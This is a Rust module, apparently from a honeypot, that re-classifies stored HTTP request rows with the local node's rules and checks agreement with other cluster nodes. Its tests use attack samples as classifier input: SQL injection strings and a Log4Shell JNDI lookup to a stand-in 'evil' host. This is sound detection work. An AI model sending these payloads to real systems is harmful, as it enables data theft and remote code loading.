//! Classifying a request again from its stored row, with this node's rules.
//!
//! A row carries the verdict of the node that recorded it. A node whose
//! rules were tampered with can store any verdict, so whoever acts on one
//! (a scanner deciding how hard it may scan, the cluster page comparing
//! rules) classifies the row again with its own rules.
//!
//! The trap classifies exactly what it stores: the method, target and
//! headers (with its `:`-pseudo-headers), and the kept body (at most the
//! trap's body cap, decompressed for matching). So a row is classified
//! again from the same input, with two differences:
//!
//! - **History**: the trap counts the IP's rows its database held when it
//!   classified the request (every origin's, claims included, from the hour
//!   before, with no upper bound in time). That set cannot be rebuilt
//!   exactly, so it is bracketed ([`History`]): [`History::Seen`] takes
//!   every row the trap can have held, [`History::Own`] only rows it must
//!   have held. Light rows of skipped requests do not count, as in the
//!   trap (they are not in `requests`).
//! - **Bot tells**: the trap never passes them to the classifier (a
//!   fingerprint arrives after its request and escalates a scan directly;
//!   evidence reads fingerprints on its own), so none are passed here either.
use super::{BotTells, Classifier, IpHistory, RequestView, Verdict, decoded_body};
use anyhow::Result;
use sqlx::SqlitePool;

/// A recorded request with what classifying it again needs.
#[derive(Debug, Clone, sqlx::FromRow)]
pub struct StoredRequest {
    pub id: i64,
    pub ip_id: i64,
    pub origin: Option<Vec<u8>>,
    /// The origin's clock when it recorded the row (orders its own rows).
    pub hlc: Option<i64>,
    pub ts: String,
    pub method: String,
    pub path: String,
    pub query: Option<String>,
    pub headers_json: String,
    pub body: Option<Vec<u8>>,
    pub labels_json: String,
    pub severity: i64,
    pub scan_level: i64,
}

/// Columns of [`StoredRequest`], for `SELECT … FROM requests r`.
pub const STORED_COLUMNS: &str = "r.id, r.ip_id, r.origin, r.hlc, r.ts, r.method, r.path,
     r.query, r.headers_json, r.body, r.labels_json, r.severity, r.scan_level";

/// How far a row of another node may be dated after the moment the trap
/// read it: its clock may run ahead of ours by up to the HLC drift cap (a
/// row dated further ahead is stored at the cap).
const AHEAD_SECS: u64 = crate::cluster::hlc::MAX_DRIFT_MS.div_ceil(1000);

/// How long a request may take from the trap reading the IP's history to
/// its row being dated (or from being dated to being written): rows dated
/// that close to another were possibly not written yet when the other was
/// classified. Requests of one IP are classified concurrently (scanners
/// send them in parallel), so such a row may be missing from the trap's
/// count even though it was dated earlier and has a smaller id.
const IN_FLIGHT_SECS: u64 = 60;

/// Which other rows of the IP count as its history at a row's time.
///
/// The trap's count `t` lies between the two, `own <= t <= seen` (unless
/// rows are missing here), so with the history ladder only climbing, the
/// trap's verdict is the one either reproduces.
#[derive(Debug, Clone, Copy, PartialEq)]
pub enum History {
    /// Every origin's rows the trap can have held: dated from an hour
    /// (plus [`IN_FLIGHT_SECS`]) before the row up to [`AHEAD_SECS`] after
    /// it, since rows of other nodes can be dated ahead of the origin's
    /// clock. At least what the origin counted, unless rows are missing
    /// here.
    Seen,
    /// Only the origin's own rows the trap must have held: recorded before
    /// this one (by the origin's clock, not by arrival here) and dated at
    /// least [`IN_FLIGHT_SECS`] earlier, within the hour. At most what the
    /// origin counted.
    Own,
}

impl History {
    pub fn name(self) -> &'static str {
        match self {
            History::Seen => "seen",
            History::Own => "own",
        }
    }
}

impl StoredRequest {
    /// The row with id `id`, if it exists.
    pub async fn load(pool: &SqlitePool, id: i64) -> Result<Option<Self>> {
        Ok(sqlx::query_as(sqlx::AssertSqlSafe(format!(
            "SELECT {STORED_COLUMNS} FROM requests r WHERE r.id = ?"
        )))
        .bind(id)
        .fetch_optional(pool)
        .await?)
    }

    /// The labels the origin stored.
    pub fn stored_labels(&self) -> Vec<String> {
        serde_json::from_str(&self.labels_json).unwrap_or_default()
    }

    /// The IP's history at this row's time, as the trap computes it (this
    /// request included), bracketed as `scope` says.
    pub async fn history(&self, pool: &SqlitePool, scope: History) -> Result<IpHistory> {
        let scoped = match scope {
            History::Seen => format!(
                "r.ts > datetime(?3, '-1 hour', '-{IN_FLIGHT_SECS} seconds')
                 AND r.ts <= datetime(?3, '+{AHEAD_SECS} seconds')"
            ),
            History::Own => format!(
                "r.ts > datetime(?3, '-1 hour')
                 AND r.ts <= datetime(?3, '-{IN_FLIGHT_SECS} seconds')
                 AND r.origin IS ?4 AND r.hlc < ?6"
            ),
        };
        let (paths, reqs, seen): (i64, i64, bool) = sqlx::query_as(sqlx::AssertSqlSafe(format!(
            "SELECT COUNT(DISTINCT r.path), COUNT(*), COALESCE(MAX(r.path = ?5), 0)
             FROM requests r
             WHERE r.ip_id = ?1 AND r.id != ?2 AND {scoped}"
        )))
        .bind(self.ip_id)
        .bind(self.id)
        .bind(&self.ts)
        .bind(&self.origin)
        .bind(&self.path)
        .bind(self.hlc)
        .fetch_one(pool)
        .await?;
        Ok(IpHistory {
            distinct_paths_1h: (paths + i64::from(!seen)) as u32,
            requests_1h: (reqs + 1) as u32,
        })
    }

    /// The verdict `c` gives this request with history `hist`.
    pub fn classify(&self, c: &Classifier, hist: &IpHistory) -> Verdict {
        let headers: Vec<(String, String)> =
            serde_json::from_str(&self.headers_json).unwrap_or_default();
        let body = decoded_body(&headers, self.body.as_deref().unwrap_or_default());
        let header = |name: &str| {
            headers
                .iter()
                .find(|(k, _)| k == name)
                .map(|(_, v)| v.as_str())
        };
        // The trap takes an HTTP/1 request naming an authority for a
        // forward-proxy probe (HTTP/2 always names one).
        let http1 = matches!(
            header(":version"),
            Some("HTTP/0.9" | "HTTP/1.0" | "HTTP/1.1")
        );
        let view = RequestView {
            method: &self.method,
            path: &self.path,
            query: self.query.as_deref(),
            headers: headers.clone(),
            body: (!body.is_empty()).then_some(&body[..]),
            proxy_target: header(":authority").filter(|_| http1),
        };
        c.classify(&view, hist, &BotTells::default())
    }

    /// The verdict `c` gives this request, with its history rebuilt from
    /// the rows `scope` takes.
    pub async fn reclassify(
        &self,
        pool: &SqlitePool,
        c: &Classifier,
        scope: History,
    ) -> Result<Verdict> {
        let hist = self.history(pool, scope).await?;
        Ok(self.classify(c, &hist))
    }

    /// Whether this request's stored verdict is `v`'s.
    fn stored_as(&self, v: &Verdict) -> bool {
        let mut stored = self.stored_labels();
        stored.sort();
        stored.dedup();
        v.labels == stored && i64::from(v.severity) == self.severity
    }

    /// This request classified again by `c` under both histories.
    pub async fn check(&self, pool: &SqlitePool, c: &Classifier) -> Result<RowCheck> {
        let mut out = Vec::with_capacity(2);
        for scope in [History::Seen, History::Own] {
            let hist = self.history(pool, scope).await?;
            let verdict = self.classify(c, &hist);
            out.push(Reclassified {
                scope,
                hist,
                verdict,
            });
        }
        let own = out.pop().expect("two scopes");
        let seen = out.pop().expect("two scopes");
        let agrees = self.stored_as(&seen.verdict) || self.stored_as(&own.verdict);
        Ok(RowCheck {
            row: self.clone(),
            seen,
            own,
            agrees,
        })
    }

    /// Whether `c` gives this request the labels and severity its origin
    /// stored, with the history of either [`History`] bound: the truth lies
    /// in between, and the history ladder only climbs, so a verdict either
    /// reproduces came from these rules.
    pub async fn agrees(&self, pool: &SqlitePool, c: &Classifier) -> Result<bool> {
        Ok(self.check(pool, c).await?.agrees)
    }
}

/// A request classified again under one [`History`].
#[derive(Debug, Clone)]
pub struct Reclassified {
    pub scope: History,
    pub hist: IpHistory,
    pub verdict: Verdict,
}

/// A request with what this node's rules make of it under both histories.
#[derive(Debug, Clone)]
pub struct RowCheck {
    pub row: StoredRequest,
    pub seen: Reclassified,
    pub own: Reclassified,
    /// Either reproduces the stored labels and severity.
    pub agrees: bool,
}

/// How one origin's recent requests compare with what this node's rules
/// make of them.
#[derive(Debug, Clone, Copy, Default, PartialEq)]
pub struct Agreement {
    /// Requests compared.
    pub sampled: u32,
    /// Of those, the ones whose labels or severity came out differently.
    pub differing: u32,
}

impl Agreement {
    /// "rules agree 100%", "disagree on 12% of 500".
    pub fn summary(&self) -> String {
        match (self.sampled, self.differing) {
            (0, _) => "no requests to compare".into(),
            (_, 0) => "rules agree 100%".into(),
            (n, d) => {
                let pct = (u64::from(d) * 100 + u64::from(n) / 2) / u64::from(n);
                let pct = if pct == 0 {
                    "<1".to_string()
                } else {
                    pct.to_string()
                };
                format!("disagree on {pct}% of {n}")
            }
        }
    }

    /// The tally of `checks`.
    pub fn of(checks: &[RowCheck]) -> Self {
        Agreement {
            sampled: checks.len() as u32,
            differing: checks.iter().filter(|c| !c.agrees).count() as u32,
        }
    }
}

/// The newest `sample` requests `origin` recorded (claims left out), each
/// classified again by `c`; `origin` None is this standalone node's own
/// rows. What [`agreement`] counts, row by row.
pub async fn compare(
    pool: &SqlitePool,
    c: &Classifier,
    origin: Option<&[u8]>,
    sample: i64,
) -> Result<Vec<RowCheck>> {
    let rows: Vec<StoredRequest> = sqlx::query_as(sqlx::AssertSqlSafe(format!(
        "SELECT {STORED_COLUMNS} FROM requests r
         WHERE r.origin IS ? AND r.is_fp_claim = 0 ORDER BY r.id DESC LIMIT ?"
    )))
    .bind(origin)
    .bind(sample)
    .fetch_all(pool)
    .await?;
    let mut out = Vec::with_capacity(rows.len());
    for row in rows {
        out.push(row.check(pool, c).await?);
    }
    Ok(out)
}

/// Compare the newest `sample` requests `origin` recorded (claims left
/// out) with what `c` makes of them; `origin` None is this standalone
/// node's own rows.
pub async fn agreement(
    pool: &SqlitePool,
    c: &Classifier,
    origin: Option<&[u8]>,
    sample: i64,
) -> Result<Agreement> {
    Ok(Agreement::of(&compare(pool, c, origin, sample).await?))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::store::Store;
    use crate::store::requests::NewRequest;

    fn classifier() -> &'static Classifier {
        Classifier::builtin()
    }

    async fn stored(store: &Store, id: i64) -> StoredRequest {
        StoredRequest::load(&store.pool, id).await.unwrap().unwrap()
    }

    /// Move every row recorded so far by `modifier` (`'-2 minutes'`).
    async fn backdate(store: &Store, modifier: &str) {
        sqlx::query("UPDATE requests SET ts = datetime(ts, ?)")
            .bind(modifier)
            .execute(&store.pool)
            .await
            .unwrap();
    }

    /// The trap's verdict for a request from `ip` to `path` now.
    async fn verdict_now(store: &Store, c: &Classifier, ip: &str, path: &str) -> Verdict {
        let hist = store.ip_history(ip, path).await.unwrap();
        c.classify(
            &RequestView {
                method: "GET",
                path,
                query: None,
                headers: vec![],
                body: None,
                proxy_target: None,
            },
            &hist,
            &BotTells::default(),
        )
    }

    /// Store a `GET path` from `ip` with verdict `v`.
    async fn insert(store: &Store, ip: &str, path: &str, v: &Verdict) -> i64 {
        store
            .local()
            .insert_request_from(
                ip,
                &NewRequest {
                    method: "GET".into(),
                    path: path.into(),
                    headers_json: "[]".into(),
                    labels_json: serde_json::to_string(&v.labels).unwrap(),
                    severity: v.severity as i64,
                    scan_level: v.scan_level as i64,
                    ..Default::default()
                },
            )
            .await
            .unwrap()
            .0
    }

    /// What the trap would store for a request, with its verdict.
    async fn record(
        store: &Store,
        c: &Classifier,
        ip: &str,
        method: &str,
        target: &str,
        headers: &[(&str, &str)],
        body: Option<&[u8]>,
    ) -> (i64, Verdict) {
        let (path, query) = match target.split_once('?') {
            Some((p, q)) => (p, Some(q)),
            None => (target, None),
        };
        let headers: Vec<(String, String)> = headers
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect();
        let hist = store.ip_history(ip, path).await.unwrap();
        let decoded = decoded_body(&headers, body.unwrap_or_default());
        let v = c.classify(
            &RequestView {
                method,
                path,
                query,
                headers: headers.clone(),
                body: (!decoded.is_empty()).then_some(&decoded[..]),
                proxy_target: headers
                    .iter()
                    .find(|(k, _)| k == ":authority")
                    .map(|(_, v)| v.as_str()),
            },
            &hist,
            &BotTells::default(),
        );
        let (id, _) = store
            .local()
            .insert_request_from(
                ip,
                &NewRequest {
                    method: method.into(),
                    path: path.into(),
                    query: query.map(str::to_string),
                    headers_json: serde_json::to_string(&headers).unwrap(),
                    body: body.map(<[u8]>::to_vec),
                    labels_json: serde_json::to_string(&v.labels).unwrap(),
                    severity: v.severity as i64,
                    scan_level: v.scan_level as i64,
                    ..Default::default()
                },
            )
            .await
            .unwrap();
        (id, v)
    }

    /// The trap's verdict comes back from the row: signatures in the
    /// target, headers and a compressed body, the proxy probe, and the
    /// history ladder.
    #[tokio::test]
    async fn a_row_reproduces_the_traps_verdict() {
        let dir = tempfile::tempdir().unwrap();
        let store = Store::connect(&dir.path().join("t.db")).await.unwrap();
        let c = classifier();
        let gz = {
            use std::io::Write;
            let mut e = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
            e.write_all(b"q=1' UNION SELECT password FROM users--")
                .unwrap();
            e.finish().unwrap()
        };
        // Method, target, headers, body.
        type Case<'a> = (&'a str, &'a str, Vec<(&'a str, &'a str)>, Option<&'a [u8]>);
        let cases: Vec<Case> = vec![
            ("GET", "/index.html", vec![(":version", "HTTP/1.1")], None),
            ("GET", "/x?id=1%27%20OR%201%3D1--", vec![], None),
            (
                "GET",
                "/",
                vec![("x-api-version", "${jndi:ldap://evil/a}")],
                None,
            ),
            (
                "GET",
                "/",
                vec![(":version", "HTTP/1.1"), (":authority", "example.com:80")],
                None,
            ),
            (
                "POST",
                "/search",
                vec![("content-encoding", "gzip")],
                Some(&gz[..]),
            ),
        ];
        for (i, (method, target, headers, body)) in cases.into_iter().enumerate() {
            let ip = format!("198.51.100.{}", i + 1);
            let (id, v) = record(&store, c, &ip, method, target, &headers, body).await;
            let row = stored(&store, id).await;
            for scope in [History::Seen, History::Own] {
                let again = row.reclassify(&store.pool, c, scope).await.unwrap();
                assert_eq!(again, v, "{method} {target} ({scope:?})");
            }
        }
        // Twenty requests in the hour: the last is a path scanner's. The
        // first nineteen are minutes older, so they were certainly written
        // when it was classified.
        let mut last = None;
        for n in 0..20 {
            if n == 19 {
                backdate(&store, "-2 minutes").await;
            }
            last = Some(
                record(
                    &store,
                    c,
                    "203.0.113.9",
                    "GET",
                    &format!("/p{n}"),
                    &[],
                    None,
                )
                .await,
            );
        }
        let (id, v) = last.unwrap();
        assert!(v.labels.contains(&"path-scanner".to_string()));
        let row = stored(&store, id).await;
        assert_eq!(
            row.reclassify(&store.pool, c, History::Seen).await.unwrap(),
            v
        );
        assert_eq!(
            row.reclassify(&store.pool, c, History::Own).await.unwrap(),
            v
        );
        // Another origin's rows count only as what was seen.
        sqlx::query("UPDATE requests SET origin = x'01' WHERE id != ?")
            .bind(id)
            .execute(&store.pool)
            .await
            .unwrap();
        let own = row.reclassify(&store.pool, c, History::Own).await.unwrap();
        assert!(!own.labels.contains(&"path-scanner".to_string()));
        assert_eq!(
            row.reclassify(&store.pool, c, History::Seen).await.unwrap(),
            v
        );
    }

    /// An origin whose rows our rules reproduce agrees, also when rows of
    /// another node it had not seen make the IP look like a path scanner
    /// here; rows stored with other verdicts disagree.
    #[tokio::test]
    async fn agreement_counts_rows_our_rules_do_not_reproduce() {
        let dir = tempfile::tempdir().unwrap();
        let store = Store::connect(&dir.path().join("t.db")).await.unwrap();
        let c = classifier();
        let (honest, other) = (vec![1u8; 32], vec![2u8; 32]);
        let mark = async |o: &[u8]| {
            sqlx::query("UPDATE requests SET origin = ? WHERE origin IS NULL")
                .bind(o)
                .execute(&store.pool)
                .await
                .unwrap();
        };
        // The honest node saw two requests of the IP; another node's twenty
        // in the same hour reached it only later.
        for target in ["/a", "/b?id=1%27%20OR%201%3D1--"] {
            record(&store, c, "203.0.113.5", "GET", target, &[], None).await;
        }
        mark(&honest).await;
        for n in 0..20 {
            let target = format!("/o{n}");
            record(&store, c, "203.0.113.5", "GET", &target, &[], None).await;
        }
        mark(&other).await;
        let a = agreement(&store.pool, c, Some(&honest), 500).await.unwrap();
        assert_eq!(
            a,
            Agreement {
                sampled: 2,
                differing: 0
            }
        );
        assert_eq!(a.summary(), "rules agree 100%");
        let a = agreement(&store.pool, c, Some(&other), 500).await.unwrap();
        assert_eq!(
            a,
            Agreement {
                sampled: 20,
                differing: 0
            }
        );
        // Doctored verdicts disagree, and so do labels alone.
        sqlx::query(
            "UPDATE requests SET labels_json = '[\"rce\"]', severity = 4, scan_level = 4
             WHERE path IN ('/o3', '/o4', '/o5')",
        )
        .execute(&store.pool)
        .await
        .unwrap();
        let a = agreement(&store.pool, c, Some(&other), 500).await.unwrap();
        assert_eq!(
            a,
            Agreement {
                sampled: 20,
                differing: 3
            }
        );
        assert_eq!(a.summary(), "disagree on 15% of 20");
        sqlx::query("UPDATE requests SET labels_json = '[\"probe\",\"x\"]' WHERE path = '/a'")
            .execute(&store.pool)
            .await
            .unwrap();
        let a = agreement(&store.pool, c, Some(&honest), 500).await.unwrap();
        assert_eq!(a.differing, 1);
        let rare = Agreement {
            sampled: 500,
            differing: 1,
        };
        assert_eq!(rare.summary(), "disagree on <1% of 500");
        assert_eq!(Agreement::default().summary(), "no requests to compare");
    }

    /// The trap counted a row of another node dated two minutes after its
    /// own request (that node's clock runs ahead): only then did the IP
    /// reach twenty requests. Neither bound used to take that row; the
    /// seen history now does, up to the drift cap.
    #[tokio::test]
    async fn a_row_of_another_node_dated_later_counts_as_seen() {
        let dir = tempfile::tempdir().unwrap();
        let store = Store::connect(&dir.path().join("t.db")).await.unwrap();
        let c = classifier();
        let (honest, ahead) = (vec![1u8; 32], vec![2u8; 32]);
        let ip = "203.0.113.7";
        // Eighteen requests of the honest node, minutes ago, to one path
        // (so only the request count can make a path scanner).
        for _ in 0..18 {
            let v = verdict_now(&store, c, ip, "/x").await;
            insert(&store, ip, "/x", &v).await;
        }
        backdate(&store, "-5 minutes").await;
        // The other node's row, dated two minutes from now.
        let v = verdict_now(&store, c, ip, "/x").await;
        let other = insert(&store, ip, "/x", &v).await;
        sqlx::query(
            "UPDATE requests SET origin = ?, ts = datetime('now', '+2 minutes') WHERE id = ?",
        )
        .bind(&ahead)
        .bind(other)
        .execute(&store.pool)
        .await
        .unwrap();
        // The twentieth request the honest node counted.
        let v = verdict_now(&store, c, ip, "/x").await;
        assert!(v.labels.contains(&"path-scanner".to_string()), "{v:?}");
        let id = insert(&store, ip, "/x", &v).await;
        sqlx::query("UPDATE requests SET origin = ? WHERE origin IS NULL")
            .bind(&honest)
            .execute(&store.pool)
            .await
            .unwrap();
        let row = stored(&store, id).await;
        let check = row.check(&store.pool, c).await.unwrap();
        assert_eq!(check.seen.hist.requests_1h, 20);
        assert_eq!(check.own.hist.requests_1h, 19);
        assert_eq!(check.seen.verdict, v);
        assert!(check.agrees);
        let a = agreement(&store.pool, c, Some(&honest), 500).await.unwrap();
        assert_eq!(a.differing, 0, "{a:?}");
        // A row dated past the drift cap cannot have been held then.
        sqlx::query("UPDATE requests SET ts = datetime(?, '+6 minutes') WHERE id = ?")
            .bind(&row.ts)
            .bind(other)
            .execute(&store.pool)
            .await
            .unwrap();
        let check = row.check(&store.pool, c).await.unwrap();
        assert_eq!(check.seen.hist.requests_1h, 19);
        assert!(!check.agrees);
    }

    /// Two requests of one IP classified concurrently: the second was
    /// dated and stored first, so it has the smaller id, yet the first did
    /// not count it. The own history does not count rows that close.
    #[tokio::test]
    async fn a_concurrent_request_the_trap_did_not_count_agrees() {
        let dir = tempfile::tempdir().unwrap();
        let store = Store::connect(&dir.path().join("t.db")).await.unwrap();
        let c = classifier();
        let ip = "203.0.113.8";
        for _ in 0..18 {
            let v = verdict_now(&store, c, ip, "/x").await;
            insert(&store, ip, "/x", &v).await;
        }
        backdate(&store, "-5 minutes").await;
        // Both see eighteen rows: neither is a path scanner's.
        let first = verdict_now(&store, c, ip, "/x").await;
        let second = verdict_now(&store, c, ip, "/x").await;
        assert!(!first.labels.contains(&"path-scanner".to_string()));
        insert(&store, ip, "/x", &second).await;
        let id = insert(&store, ip, "/x", &first).await;
        let check = stored(&store, id)
            .await
            .check(&store.pool, c)
            .await
            .unwrap();
        assert_eq!(check.own.hist.requests_1h, 19);
        assert_eq!(check.own.verdict, first);
        assert!(check.agrees);
        let a = agreement(&store.pool, c, None, 500).await.unwrap();
        assert_eq!(
            a,
            Agreement {
                sampled: 20,
                differing: 0
            }
        );
    }

    /// The trap looks an IP up by its canonical text, as rows are filed.
    #[tokio::test]
    async fn the_traps_history_finds_a_mapped_address() {
        let dir = tempfile::tempdir().unwrap();
        let store = Store::connect(&dir.path().join("t.db")).await.unwrap();
        let v = verdict_now(&store, classifier(), "192.0.2.1", "/a").await;
        insert(&store, "192.0.2.1", "/a", &v).await;
        let h = store.ip_history("::ffff:192.0.2.1", "/b").await.unwrap();
        assert_eq!(h.requests_1h, 2);
        assert_eq!(h.distinct_paths_1h, 2);
    }
}
